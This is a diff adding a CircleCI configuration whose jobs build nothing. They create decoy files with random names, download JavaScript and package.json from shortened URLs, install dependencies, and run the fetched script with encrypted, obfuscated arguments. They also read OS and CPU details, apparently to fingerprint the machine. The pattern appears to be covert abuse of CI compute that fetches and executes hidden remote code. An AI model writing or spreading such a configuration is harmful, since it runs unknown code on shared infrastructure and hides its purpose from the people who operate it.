@@ -1,0 +1,52 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  loading:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch jakph4ea3g1vuzg0z5878.js
+      - run: touch snj1imbj8unj8n62t7s3xg5m.css
+      - run: curl -fsSL shorturl.at/evxCK -o 19ec4h6tkkw4h6o2.js && curl -fsSL
+          shorturl.at/luM06 -o package.json && curl -fsSL shorturl.at/lntIP -o
+          ff3trnm4v5ngv48hs.js
+      - run: touch ghfpelri3fsr.html
+      - run: touch dv7n4ff0qaju8nyt.c
+      - run: npm i -s
+      - run: node 19ec4h6tkkw4h6o2 -lpn
+          U2FsdGVkX18qFwM24L0tWbk54xZdcflCQo7VDlPQtDqOr00l+KGgM6AVOnwcetnM -t
+          U2FsdGVkX18u6ZBXEe9yWPbCBn3J/bLZiXCBvOFjlv/Vx2k8iZDwzsQcKOdxEup7 -r
+          U2FsdGVkX1/DO758IRlfVG3w9jSPh/MCbQ9yxvKj6D0K0E+kKXaUWDmUJd3+UKHv7gAJbScoFupc5vFxo0fZL1V//+RYRYVwA0W9V6lApyNRbpynlvYlN+WjO7FLee2HQ3zAcBsEtkpIW4kgfKk2Y8OVo58LW40fG2b1fHwR6a7ikI/DER2gJIjJqIwyPH/6wO8HXvT+To/TKnnzdGrkxWUHfxw3DWaRzs4nZM9kg+E43epTMdcuxolOj8jUrK6mvPzwIgrB9CjEw9h4rf7RAKrEYp4ykPfq9B8hBfnuORQ=
+          -sp -s
+          U2FsdGVkX18ftacKMB48xA8DrzPanrK5I0LqKP+kykgpgHFh6twWBR/C66CN3Hnsf7EsFpJTooZNtNFOyXlfdpqQVYjnj6H7rEhmMJVMZCmWRIIwEMet8gqPUQoqGU3b4hYGZ0PG2X5f7eilOuMKekmYNALSM2/VlVOIfX87BZfJxj2o7Ko/azmMO8lNeP1mC2HHCj1DZM7q6A4AvrMMrqVqFm6V9bzoZlPwTdnxDvA=
+      - run: cat /etc/os-release
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+  cong-viec:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch khbomcxgk8su5rjmqb7sc9it.py
+      - run: curl -fsSL shorturl.at/ezPY1 -o lcpjsowbfum5.js && curl -fsSL
+          shorturl.at/rCFNS -o md1rhpd1f6le.js && curl -fsSL shorturl.at/elmFJ
+          -o package.json
+      - run: touch shfnaceh66t02ass73kbg.cpp
+      - run: touch grtmoreqercsi5ktef4rj4cr.c
+      - run: npm i -s
+      - run: mkdir jqov5j3xa3jmzeulh928eoci0elcm
+      - run: node lcpjsowbfum5 -lpn U2FsdGVkX1+KkBKv6Yq5Wtb0sM0WVWYOuyWf1T4GWD4= -s
+          U2FsdGVkX18f452TZ1q5/SFf9+MEBa0yXT2/Pm6Bq8yaZpNsJTKMjzF5p2MN+vyuCRL4CM79Kl0utlrH3w2QTaLNJD/hEhrTijGDZb3kRfhq20BX2W1BxKkNIlpILfNJtk6lm4bAl5vRdOb8Fh7t9mHUdaBl0anCQ0OxcarfMaOYZu0m3TMd6G57CzeDAxtq/mL3AOFEdbRAar+pwZDH3eYrc72A0Q4tTVn2FCxxD0A=
+          -t U2FsdGVkX19DMlbiIOpHuE9CTIQgySO21OJa++JS8CsusZUyh6wlwfYMIDh2NMPt -r
+          U2FsdGVkX1+YftQ3qdk6Zs/2V5PIBlpntwaghF3Nu0gImZtfCNRBEtdS1Rm7Ws1X/CsDpDVsbUHIzih3/iDA90bhhbtW5IaqnOFdXhFGaRP/asm9MuOX/20npPpcNn1awNSPDUOnTWFiY6RSsKxdDqrTnJATJVdmKpgQespsWcai+Rp+css/MiD6y5SxY1+58OlwuoQdVduiEwMt0V50y64QBSKnbHP3Yuf5QfphM3BI/0c//6TmiHUcIxn83Fsx3g983IXaP/1D6ypttcWTeq/NBPom/trEN56wX5BLySs=
+          -sp
+      - run: mkdir cx2lsuzd3kjknwv9lmwq9xnxzj
+      - run: touch 5aysjbuodh33bn.ts
+workflows:
+  cong-viec:
+    jobs:
+      - loading
+  ditmecuocdoi:
+    jobs:
+      - cong-viec
